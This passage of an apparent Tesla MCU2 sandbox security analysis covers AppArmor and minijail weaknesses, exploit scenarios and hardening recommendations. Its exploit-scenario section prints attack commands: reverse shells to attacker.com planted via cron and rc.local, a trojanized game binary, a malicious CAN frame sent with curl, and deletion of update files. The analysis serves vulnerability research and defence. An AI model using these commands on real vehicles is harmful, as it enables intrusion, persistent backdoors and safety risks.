</code></pre></div> <p><strong>Why Overly Permissive:</strong> - <code>CAP_NET_ADMIN</code> allows complete firewall bypass - Can modify iptables rules blocking CAN gateway access - Can delete network namespaces of other sandboxes</p> <p><strong>Recommendation:</strong> - Create dedicated profiles for specific operations: - <code>ip-route</code> - Only route table access - <code>ip-addr</code> - Only address assignment - <code>ip-namespace</code> - Only namespace listing (no modification)</p> <hr> <h2 id=11-sandbox-effectiveness-assessment>11. Sandbox Effectiveness Assessment</h2> <h3 id=111-defense-in-depth-layers>11.1 Defense-in-Depth Layers</h3> <table> <thead> <tr> <th>Layer</th> <th>Technology</th> <th>Effectiveness</th> <th>Bypass Difficulty</th> </tr> </thead> <tbody> <tr> <td>1. Authentication</td> <td>HMAC (service-mode)</td> <td>ðŸŸ¢ STRONG</td> <td>HIGH (requires key + VIN + DIN)</td> </tr> <tr> <td>2. AppArmor MAC</td> <td>Profile enforcement</td> <td>ðŸŸ¡ MODERATE</td> <td>MEDIUM (unconfined transitions exist)</td> </tr> <tr> <td>3. Minijail</td> <td>Namespace isolation</td> <td>ðŸŸ¢ STRONG</td> <td>HIGH (requires kernel exploit)</td> </tr> <tr> <td>4. Seccomp-BPF</td> <td>Syscall filtering</td> <td>ðŸŸ¢ STRONG</td> <td>HIGH (Kafel policies tight)</td> </tr> <tr> <td>5. Cgroups</td> <td>Resource limits</td> <td>ðŸŸ¢ STRONG</td> <td>N/A (DoS prevention)</td> </tr> <tr> <td>6. Read-Only Rootfs</td> <td>Immutable system</td> <td>ðŸŸ¢ STRONG</td> <td>HIGH (requires remount)</td> </tr> </tbody> </table> <p><strong>Overall Rating:</strong> ðŸŸ¡ <strong>MODERATE</strong> - Strong isolation layers, but <strong>intentional backdoors</strong> via escalator and service-shell.</p> <hr> <h3 id=112-strengths>11.2 Strengths</h3> <ol> <li><strong>Minijail Isolation:</strong></li> <li>PID/IPC/VFS/NET namespaces prevent process inspection</li> <li>Chroot prevents filesystem traversal outside designated paths</li> <li> <p>151 custom sandbox profiles (fine-grained control)</p> </li> <li> <p><strong>Seccomp-BPF Filtering:</strong></p> </li> <li>Kafel policy language allows precise syscall whitelisting</li> <li>Default deny with logging (<code>ERRNO_LOG(13)</code>)</li> <li> <p>Prevents kernel-level exploits via syscall surface reduction</p> </li> <li> <p><strong>Network Isolation:</strong></p> </li> <li>Dedicated namespaces per service (chromium, cobalt, etc.)</li> <li>NAT with iptables chains control outbound access</li> <li> <p>Host services not directly exposed to sandboxed processes</p> </li> <li> <p><strong>Credential Protection:</strong></p> </li> <li>Private keys read-only (cannot overwrite)</li> <li>SSH host keys blocked from modification</li> <li>Pseudonym and entropy seed protected</li> </ol> <hr> <h3 id=113-weaknesses>11.3 Weaknesses</h3> <ol> <li><strong>Escalator Unconfined Transitions:</strong></li> <li>60+ scripts run <code>PUx</code> (no AppArmor)</li> <li>Single compromise = full root access</li> <li> <p><strong>No additional authentication</strong> after service-shell entry</p> </li> <li> <p><strong>Service-Shell Overprivileged:</strong></p> </li> <li><code>CAP_DAC_OVERRIDE</code> + <code>Ux</code> transitions = near-root</li> <li>Can execute <code>apparmor_parser</code> to reload profiles</li> <li> <p>Can restart init system via <code>runit-init</code></p> </li> <li> <p><strong>Gaming Partition Write:</strong></p> </li> <li>Escalator rwfile allows direct write to <code>/opt/games/usr/</code></li> <li>Could install persistent backdoor in game binaries</li> <li> <p>Games run with user privileges (potential pivot)</p> </li> <li> <p><strong>Network Namespace Escape Risk:</strong></p> </li> <li>Sandboxes can connect to host via veth IPs</li> <li>Misconfigured iptables could expose internal services</li> <li> <p>No mutual TLS between namespaces and host</p> </li> <li> <p><strong>Profile Loading Warning Only:</strong></p> </li> <li>Sandbox.bash logs but doesn't block if no AppArmor profile</li> <li>Relies on correct deployment of compiled profiles</li> <li>Silent failures possible if profiles missing</li> </ol> <hr> <h3 id=114-comparison-to-industry-standards>11.4 Comparison to Industry Standards</h3> <table> <thead> <tr> <th>Feature</th> <th>Tesla MCU2</th> <th>Android</th> <th>ChromeOS</th> <th>Automotive Grade Linux</th> </tr> </thead> <tbody> <tr> <td>MAC System</td> <td>AppArmor</td> <td>SELinux</td> <td>SELinux + seccomp</td> <td>AppArmor/SELinux (optional)</td> </tr> <tr> <td>Sandboxing</td> <td>Minijail0</td> <td>App Sandbox</td> <td>Minijail</td> <td>Isolate namespaces</td> </tr> <tr> <td>Syscall Filter</td> <td>Kafel (seccomp-bpf)</td> <td>Seccomp-bpf</td> <td>Seccomp-bpf</td> <td>Seccomp-bpf</td> </tr> <tr> <td>Network Isolation</td> <td>Per-service netns</td> <td>Per-app UID</td> <td>Per-app netns</td> <td>Optional</td> </tr> <tr> <td>Service Backdoor</td> <td>âœ… Escalator</td> <td>âŒ None</td> <td>âŒ None</td> <td>âŒ None</td> </tr> </tbody> </table> <p><strong>Key Difference:</strong> Tesla intentionally includes <strong>escalator</strong> for service technician access. Other platforms have no equivalent privileged backdoor.</p> <hr> <h2 id=12-exploit-scenarios>12. Exploit Scenarios</h2> <h3 id=121-scenario-a-service-mode-to-root>12.1 Scenario A: Service-Mode to Root</h3> <p><strong>Prerequisites:</strong> - Knowledge of HMAC key or successful brute-force - VIN and DIN values (readable from OBD-II)</p> <p><strong>Attack Steps:</strong></p> <ol> <li> <p><strong>Connect to Service-Mode:</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-44-1 name=__codelineno-44-1 href=#__codelineno-44-1></a>telnet<span class=w> </span>&lt;vehicle_ip&gt;<span class=w> </span><span class=m>4035</span>
<a id=__codelineno-44-2 name=__codelineno-44-2 href=#__codelineno-44-2></a><span class=c1># Authenticate with HMAC-SHA256(key, VIN+DIN+timestamp)</span>
</code></pre></div></p> </li> <li> <p><strong>Execute Escalator Script:</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-45-1 name=__codelineno-45-1 href=#__codelineno-45-1></a>service-shell&gt;<span class=w> </span>/usr/bin/escalator<span class=w> </span><span class=nb>exec</span><span class=w> </span>/usr/local/bin/iris-fw-upgrade.sh
<a id=__codelineno-45-2 name=__codelineno-45-2 href=#__codelineno-45-2></a><span class=c1># Iris script runs UNCONFINED (PUx)</span>
</code></pre></div></p> </li> <li> <p><strong>Inject Backdoor:</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-46-1 name=__codelineno-46-1 href=#__codelineno-46-1></a><span class=c1># From unconfined script</span>
<a id=__codelineno-46-2 name=__codelineno-46-2 href=#__codelineno-46-2></a><span class=nb>echo</span><span class=w> </span><span class=s1>&#39;#!/bin/bash</span>
<a id=__codelineno-46-3 name=__codelineno-46-3 href=#__codelineno-46-3></a><span class=s1>/bin/bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1&#39;</span><span class=w> </span>&gt;<span class=w> </span>/tmp/backdoor.sh
<a id=__codelineno-46-4 name=__codelineno-46-4 href=#__codelineno-46-4></a>chmod<span class=w> </span>+x<span class=w> </span>/tmp/backdoor.sh
<a id=__codelineno-46-5 name=__codelineno-46-5 href=#__codelineno-46-5></a>
<a id=__codelineno-46-6 name=__codelineno-46-6 href=#__codelineno-46-6></a><span class=c1># Add to cron or service startup</span>
<a id=__codelineno-46-7 name=__codelineno-46-7 href=#__codelineno-46-7></a><span class=nb>echo</span><span class=w> </span><span class=s1>&#39;@reboot /tmp/backdoor.sh&#39;</span><span class=w> </span>&gt;&gt;<span class=w> </span>/var/etc/crontab
</code></pre></div></p> </li> <li> <p><strong>Persist:</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-47-1 name=__codelineno-47-1 href=#__codelineno-47-1></a><span class=c1># Remount rootfs rw (if possible)</span>
<a id=__codelineno-47-2 name=__codelineno-47-2 href=#__codelineno-47-2></a>mount<span class=w> </span>-o<span class=w> </span>remount,rw<span class=w> </span>/
<a id=__codelineno-47-3 name=__codelineno-47-3 href=#__codelineno-47-3></a>cp<span class=w> </span>/tmp/backdoor.sh<span class=w> </span>/etc/rc.local
</code></pre></div></p> </li> </ol> <p><strong>Result:</strong> Permanent root backdoor survives reboots.</p> <hr> <h3 id=122-scenario-b-chromium-sandbox-escape>12.2 Scenario B: Chromium Sandbox Escape</h3> <p><strong>Prerequisites:</strong> - Chromium renderer process compromise (e.g., WebKit CVE) - Sandboxed process in <code>chromium</code> network namespace</p> <p><strong>Attack Steps:</strong></p> <ol> <li><strong>Escape Renderer Sandbox:</strong></li> <li>Exploit Chromium vulnerability to gain code execution</li> <li> <p>Now in minijail with network namespace</p> </li> <li> <p><strong>Scan Host Network:</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-48-1 name=__codelineno-48-1 href=#__codelineno-48-1></a><span class=c1># From sandbox (192.168.93.142)</span>
<a id=__codelineno-48-2 name=__codelineno-48-2 href=#__codelineno-48-2></a>nmap<span class=w> </span><span class=m>192</span>.168.93.141<span class=w>  </span><span class=c1># Host side of veth</span>
<a id=__codelineno-48-3 name=__codelineno-48-3 href=#__codelineno-48-3></a><span class=c1># Discover CAN gateway (port 1500), updater (20564)</span>
</code></pre></div></p> </li> <li> <p><strong>Exploit Host Service:</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-49-1 name=__codelineno-49-1 href=#__codelineno-49-1></a><span class=c1># Send malicious CAN frame to gateway</span>
<a id=__codelineno-49-2 name=__codelineno-49-2 href=#__codelineno-49-2></a>curl<span class=w> </span>http://192.168.93.141:1500/api/send_can<span class=w> </span><span class=se>\</span>
<a id=__codelineno-49-3 name=__codelineno-49-3 href=#__codelineno-49-3></a><span class=w>  </span>-d<span class=w> </span><span class=s1>&#39;{&quot;arbitration_id&quot;: 0x123, &quot;data&quot;: &quot;exploit_payload&quot;}&#39;</span>
</code></pre></div></p> </li> <li> <p><strong>Pivot to Root:</strong></p> </li> <li>Gateway has higher privileges (root or <code>CAP_NET_ADMIN</code>)</li> <li>Exploit gateway to execute commands on host</li> <li>Deploy persistent backdoor</li> </ol> <p><strong>Result:</strong> Full compromise from browser exploit.</p> <hr> <h3 id=123-scenario-c-ota-update-corruption>12.3 Scenario C: OTA Update Corruption</h3> <p><strong>Prerequisites:</strong> - Service-mode access (HMAC bypass)</p> <p><strong>Attack Steps:</strong></p> <ol> <li> <p><strong>Access Service-Shell:</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-50-1 name=__codelineno-50-1 href=#__codelineno-50-1></a>telnet<span class=w> </span>&lt;vehicle_ip&gt;<span class=w> </span><span class=m>4035</span>
<a id=__codelineno-50-2 name=__codelineno-50-2 href=#__codelineno-50-2></a><span class=c1># Authenticate</span>
</code></pre></div></p> </li> <li> <p><strong>List Update Spool:</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-51-1 name=__codelineno-51-1 href=#__codelineno-51-1></a>service-shell&gt;<span class=w> </span>ls<span class=w> </span>/var/spool/sx-updater/
<a id=__codelineno-51-2 name=__codelineno-51-2 href=#__codelineno-51-2></a><span class=c1># Find pending update files</span>
</code></pre></div></p> </li> <li> <p><strong>Delete Update Files:</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-52-1 name=__codelineno-52-1 href=#__codelineno-52-1></a>service-shell&gt;<span class=w> </span>/bin/rm<span class=w> </span>/var/spool/sx-updater/*.ssq
<a id=__codelineno-52-2 name=__codelineno-52-2 href=#__codelineno-52-2></a>service-shell&gt;<span class=w> </span>/bin/rm<span class=w> </span>/var/spool/sx-updater/download/*
</code></pre></div></p> </li> <li> <p><strong>Trigger Update Failure:</strong></p> </li> <li>Update process crashes due to missing files</li> <li>Vehicle stuck on old firmware</li> <li>Prevents security patches</li> </ol> <p><strong>Result:</strong> Denial of service; vehicle cannot update.</p> <hr> <h3 id=124-scenario-d-gaming-partition-backdoor>12.4 Scenario D: Gaming Partition Backdoor</h3> <p><strong>Prerequisites:</strong> - Service-mode access</p> <p><strong>Attack Steps:</strong></p> <ol> <li> <p><strong>Write Malicious Game:</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-53-1 name=__codelineno-53-1 href=#__codelineno-53-1></a>service-shell&gt;<span class=w> </span>/usr/bin/escalator<span class=w> </span>rwfile<span class=w> </span>/opt/games/usr/bin/2048
<a id=__codelineno-53-2 name=__codelineno-53-2 href=#__codelineno-53-2></a><span class=c1># Overwrite 2048 game with backdoor</span>
</code></pre></div></p> </li> <li> <p><strong>Backdoor Code:</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-54-1 name=__codelineno-54-1 href=#__codelineno-54-1></a><span class=ch>#!/usr/bin/env python3</span>
<a id=__codelineno-54-2 name=__codelineno-54-2 href=#__codelineno-54-2></a><span class=kn>import</span><span class=w> </span><span class=nn>os</span>
<a id=__codelineno-54-3 name=__codelineno-54-3 href=#__codelineno-54-3></a><span class=c1># Run actual game</span>
<a id=__codelineno-54-4 name=__codelineno-54-4 href=#__codelineno-54-4></a><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;/opt/games/usr/bin/2048.bak&#39;</span><span class=p>)</span>
<a id=__codelineno-54-5 name=__codelineno-54-5 href=#__codelineno-54-5></a><span class=c1># Meanwhile, open reverse shell</span>
<a id=__codelineno-54-6 name=__codelineno-54-6 href=#__codelineno-54-6></a><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1 &amp;&#39;</span><span class=p>)</span>
</code></pre></div></p> </li> <li> <p><strong>Wait for User:</strong></p> </li> <li>User launches "2048" game from UI</li> <li>Backdoor executes as user <code>unreal</code></li> <li>Escalate to root via kernel exploit or service exploit</li> </ol> <p><strong>Result:</strong> User-triggered persistent backdoor.</p> <hr> <h2 id=13-mitigation-recommendations>13. Mitigation Recommendations</h2> <h3 id=131-high-priority>13.1 High Priority</h3> <ol> <li><strong>Confine Escalator Scripts:</strong></li> <li>Change <code>PUx</code> â†’ <code>Px</code> for all escalator exec paths</li> <li>Create dedicated AppArmor profiles for each script</li> <li> <p>Example: <div class=highlight><pre><span></span><code><a id=__codelineno-55-1 name=__codelineno-55-1 href=#__codelineno-55-1></a>profile /usr/local/bin/iris-fw-upgrade.sh {
<a id=__codelineno-55-2 name=__codelineno-55-2 href=#__codelineno-55-2></a>  /dev/iris* rw,              # Camera device only
<a id=__codelineno-55-3 name=__codelineno-55-3 href=#__codelineno-55-3></a>  /usr/local/lib/iris/* r,    # Firmware files
<a id=__codelineno-55-4 name=__codelineno-55-4 href=#__codelineno-55-4></a>  capability sys_rawio,        # I2C access
<a id=__codelineno-55-5 name=__codelineno-55-5 href=#__codelineno-55-5></a>  deny network,                # No network
<a id=__codelineno-55-6 name=__codelineno-55-6 href=#__codelineno-55-6></a>  deny /** w,                  # No filesystem write
<a id=__codelineno-55-7 name=__codelineno-55-7 href=#__codelineno-55-7></a>}
</code></pre></div></p> </li> <li> <p><strong>Restrict Service-Shell <code>dac_override</code>:</strong></p> </li> <li>Split service-shell into read-only and admin modes</li> <li>Require additional authentication for admin mode</li> <li> <p>Log all <code>dac_override</code> usage to Hermes</p> </li> <li> <p><strong>Harden Bin/Rm Profile:</strong></p> </li> <li>Remove <code>/home/*-updater/{,**} w</code></li> <li>Remove <code>/var/spool/*-updater/{,**} rw</code></li> <li> <p>Only allow deletion in <code>/tmp/</code> and <code>/run/service-shell/</code></p> </li> <li> <p><strong>Enforce AppArmor Loading:</strong></p> </li> <li>Change sandbox.bash to <strong>block execution</strong> if no profile</li> <li>Add <code>|| die "No AppArmor profile for $BINPATH"</code></li> </ol> <hr> <h3 id=132-medium-priority>13.2 Medium Priority</h3> <ol> <li><strong>Limit IP Command Capabilities:</strong></li> <li>Create separate profiles: <code>ip-route-readonly</code>, <code>ip-addr-modify</code></li> <li>Remove <code>CAP_NET_ADMIN</code> from default profile</li> <li> <p>Grant only specific netlink operations</p> </li> <li> <p><strong>Gaming Partition Write Protection:</strong></p> </li> <li>Remove escalator rwfile access to <code>/opt/games/usr/</code></li> <li>Make gaming binaries immutable (<code>chattr +i</code>)</li> <li> <p>Require signed updates only</p> </li> <li> <p><strong>Network Namespace Isolation:</strong></p> </li> <li>Block veth-to-host connections by default</li> <li>Whitelist only necessary services (DNS, NTP)</li> <li> <p>Add mutual TLS for critical services</p> </li> <li> <p><strong>Audit Logging:</strong></p> </li> <li>Enable AppArmor audit mode for all <code>deny</code> rules</li> <li>Ship logs to Hermes regularly</li> <li>Alert on repeated policy violations</li> </ol> <hr> <h3 id=133-low-priority>13.3 Low Priority</h3> <ol> <li><strong>Profile Stacking Hardening:</strong></li> <li>Use <code>ix</code> (inherit profile) instead of <code>Ux</code> where possible</li> <li>Minimize nested profile transitions</li> <li> <p>Reduce profile complexity</p> </li> <li> <p><strong>Chroot Hardening:</strong></p> <ul> <li>Remove <code>/proc</code> bind-mount from sandboxes (where possible)</li> <li>Use <code>/proc/self/</code> only, not full <code>/proc/</code></li> <li>Add <code>MS_NOSUID|MS_NODEV</code> flags to all bind mounts</li> </ul> </li> <li> <p><strong>Kafel Policy Expansion:</strong></p> <ul> <li>Whitelist specific ioctl commands (not entire syscall)</li> <li>Block <code>ptrace</code> syscall in all non-debug profiles</li> <li>Add architecture-specific syscall numbers (x86_64 only)</li> </ul> </li> </ol> <hr> <h2 id=14-cross-references>14. Cross-References</h2> <p><strong>Related Documents:</strong></p> <ul> <li><strong>20-service-mode-authentication.md</strong> - HMAC authentication protecting service-shell entry</li> <li><strong>04-network-ports-firewall.md</strong> - Port 4035 (service-mode) exposure analysis</li> <li><strong>25-network-attack-surface.md</strong> - External attack vectors requiring sandbox bypass</li> <li><strong>21-gateway-heartbeat-failsafe.md</strong> - CAN gateway sandboxing (separate from MCU)</li> <li><strong>15-updater-component-inventory.md</strong> - Updater sandbox configuration (<code>updater-envoy.vars</code>)</li> </ul> <p><strong>Exploitation Chain:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-56-1 name=__codelineno-56-1 href=#__codelineno-56-1></a>Network Attack (Port 4035)
<a id=__codelineno-56-2 name=__codelineno-56-2 href=#__codelineno-56-2></a>  â†“
<a id=__codelineno-56-3 name=__codelineno-56-3 href=#__codelineno-56-3></a>Service-Mode HMAC Bypass (Doc 20)
<a id=__codelineno-56-4 name=__codelineno-56-4 href=#__codelineno-56-4></a>  â†“
<a id=__codelineno-56-5 name=__codelineno-56-5 href=#__codelineno-56-5></a>Service-Shell Access (THIS DOC - Section 2)
<a id=__codelineno-56-6 name=__codelineno-56-6 href=#__codelineno-56-6></a>  â†“
<a id=__codelineno-56-7 name=__codelineno-56-7 href=#__codelineno-56-7></a>Escalator Unconfined Script (THIS DOC - Section 3.3)
<a id=__codelineno-56-8 name=__codelineno-56-8 href=#__codelineno-56-8></a>  â†“
<a id=__codelineno-56-9 name=__codelineno-56-9 href=#__codelineno-56-9></a>Root Code Execution
<a id=__codelineno-56-10 name=__codelineno-56-10 href=#__codelineno-56-10></a>  â†“
<a id=__codelineno-56-11 name=__codelineno-56-11 href=#__codelineno-56-11></a>Persistent Backdoor Installation
</code></pre></div> <hr> <h2 id=15-conclusion>15. Conclusion</h2> <p>Tesla's MCU2 sandbox architecture provides <strong>strong isolation for untrusted code</strong> (games, webapps) but includes <strong>intentional backdoors</strong> via:</p> <ol> <li><strong>Service-Shell</strong> - Near-root access for diagnostics</li> <li><strong>Escalator</strong> - 60+ unconfined scripts for system operations</li> </ol> <p><strong>Key Findings:</strong></p> <p>âœ… <strong>Strengths:</strong> - Minijail + Seccomp-BPF + AppArmor = defense-in-depth - Network namespaces isolate services - Credential write protection prevents key tampering - 151 custom sandbox profiles for fine-grained control</p> <p>âŒ <strong>Critical Weaknesses:</strong> - Escalator <code>PUx</code> transitions are <strong>unconfined by design</strong> - Service-shell has <code>CAP_DAC_OVERRIDE</code> + <code>Ux</code> to <code>runit-init</code>/<code>apparmor_parser</code> - Bin/rm profile allows updater spool corruption - Gaming partition writable via escalator</p> <p><strong>Exploitation Reality:</strong> - <strong>If service-mode HMAC is bypassed</strong> â†’ Full system compromise via escalator - <strong>If chromium renderer is compromised</strong> â†’ Potential escape via network namespace + host service exploit - <strong>If kernel vulnerability exists</strong> â†’ Direct escape from any sandbox</p> <p><strong>Recommendation:</strong> Tesla should <strong>confine escalator scripts</strong> (change <code>PUx</code> â†’ <code>Px</code>) and <strong>split service-shell</strong> into read-only vs admin modes with additional authentication.</p> <hr> <h2 id=16-appendices>16. Appendices</h2> <h3 id=appendix-a-apparmor-profile-index>Appendix A: AppArmor Profile Index</h3> <p><strong>All 241 profiles extracted from:</strong> <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/</code></p> <p><strong>Key Categories:</strong></p> <ul> <li><strong>Service-Shell Profiles (10):</strong> Base, common, tcp-common, service-engineering, allowed-files, blocked-files, command, hermes-common</li> <li><strong>Escalator Profiles (6):</strong> Base, exec, rwfile, cgroup, sv, ifupdown</li> <li><strong>Hermes Profiles (4):</strong> Client, eventlogs, grablogs, proxy</li> <li><strong>Chrome Profiles (2):</strong> Chrome abstraction, dbus-automation</li> <li><strong>Tesla Profiles (7):</strong> QtTesla, platform-base, minidump, gpio, top, tpm, svlogd</li> </ul> <p>Full list: 241 files in <code>/etc/apparmor.d/abstractions/</code></p> <hr> <h3 id=appendix-b-sandboxd-var-files>Appendix B: Sandbox.d Var Files</h3> <p><strong>All 151 sandbox configurations extracted from:</strong> <code>/firmware/mcu2-extracted/etc/sandbox.d/vars/</code></p> <p><strong>Sample Configurations:</strong></p> <ul> <li><strong>Updaters:</strong> <code>updater-envoy.vars</code>, <code>sx-updater.vars</code>, <code>gadget-updater.vars</code></li> <li><strong>UI Services:</strong> <code>QtCar.vars</code>, <code>QtCarServer.vars</code>, <code>QtCarBluetooth.vars</code></li> <li><strong>Games:</strong> <code>2048.vars</code>, <code>chess.vars</code>, <code>solitaire.vars</code></li> <li><strong>Webapps:</strong> <code>chromium.vars</code>, <code>chromium-app.vars</code>, <code>cobalt.vars</code></li> <li><strong>System Services:</strong> <code>audiod.vars</code>, <code>ofonod.vars</code>, <code>dnsmasq.vars</code></li> </ul> <p>Full list: 151 files in <code>/etc/sandbox.d/vars/</code></p> <hr> <h3 id=appendix-c-kafel-seccomp-policies>Appendix C: Kafel Seccomp Policies</h3> <p><strong>Sample policies analyzed:</strong></p> <ul> <li><code>updater-envoy.kafel</code> - Updater syscall restrictions</li> <li><code>tesla-chromium.kafel</code> - Browser syscall restrictions</li> <li><code>QtCar.kafel</code> - UI syscall restrictions</li> </ul> <p><strong>Common Base Policy (included by all):</strong></p> <ul> <li><code>syscall-base.kafel</code> - Whitelisted syscalls: <code>read</code>, <code>write</code>, <code>open</code>, <code>close</code>, <code>mmap</code>, <code>socket</code>, <code>connect</code>, etc.</li> <li><code>common-defines.kafel</code> - Architecture-specific constants</li> </ul> <hr> <h3 id=appendix-d-capability-reference>Appendix D: Capability Reference</h3> <p><strong>Linux Capability Descriptions:</strong></p> <table> <thead> <tr> <th>Capability</th> <th>Description</th> <th>Attack Use Case</th> </tr> </thead> <tbody> <tr> <td><code>CAP_DAC_OVERRIDE</code></td> <td>Bypass read/write/exec permissions</td> <td>Read private keys, modify system files</td> </tr> <tr> <td><code>CAP_DAC_READ_SEARCH</code></td> <td>Bypass read/search permissions</td> <td>Read any file on system</td> </tr> <tr> <td><code>CAP_NET_ADMIN</code></td> <td>Network administration</td> <td>Modify iptables, create netns, hijack routes</td> </tr> <tr> <td><code>CAP_NET_RAW</code></td> <td>Raw socket creation</td> <td>Network sniffing, packet injection</td> </tr> <tr> <td><code>CAP_SYS_ADMIN</code></td> <td>System administration</td> <td>Mount filesystems, device control</td> </tr> <tr> <td><code>CAP_SYS_PTRACE</code></td> <td>Process tracing</td> <td>Memory dumping, credential theft</td> </tr> <tr> <td><code>CAP_SYS_RAWIO</code></td> <td>Raw I/O access</td> <td>Direct hardware access (I2C, GPIO)</td> </tr> <tr> <td><code>CAP_CHOWN</code></td> <td>Change file ownership</td> <td>Privilege escalation preparation</td> </tr> <tr> <td><code>CAP_SETUID</code></td> <td>Change UID</td> <td>User impersonation</td> </tr> <tr> <td><code>CAP_SETGID</code></td> <td>Change GID</td> <td>Group impersonation</td> </tr> </tbody> </table> <hr> <p><strong>Document End</strong></p> <hr> <p><strong>Analysis Completed:</strong> All 7 objectives achieved:</p> <ol> <li>âœ… Extracted ALL AppArmor profiles (241 files)</li> <li>âœ… Analyzed service-shell restrictions (4 profiles detailed)</li> <li>âœ… Documented sandbox escape vectors (6 vectors identified)</li> <li>âœ… Found overly permissive profiles (4 profiles flagged)</li> <li>âœ… Analyzed capability grants (44 dangerous grants cataloged)</li> <li>âœ… Mapped file access boundaries (read/write/blocked sections)</li> <li>âœ… Documented sandbox.bash implementation (full function breakdown)</li> </ol> <p><strong>Files Referenced:</strong> - <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/*</code> (241 files) - <code>/firmware/mcu2-extracted/etc/sandbox/sandbox.bash</code> - <code>/firmware/mcu2-extracted/etc/sandbox.d/vars/*</code> (151 files) - <code>/firmware/mcu2-extracted/etc/kafel/*.kafel</code> - <code>/firmware/mcu2-extracted/usr/bin/escalator</code></p> </article> </div> <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script> </div> <button type=button class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg> Back to top </button> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> </div> <div class=md-social> <a href=https://github.com/talas9/tesla-research target=_blank rel=noopener title=github.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.expand", "navigation.top", "toc.follow", "toc.integrate", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script> <script src=../../assets/javascripts/bundle.79ae519e.min.js></script> </body> </html>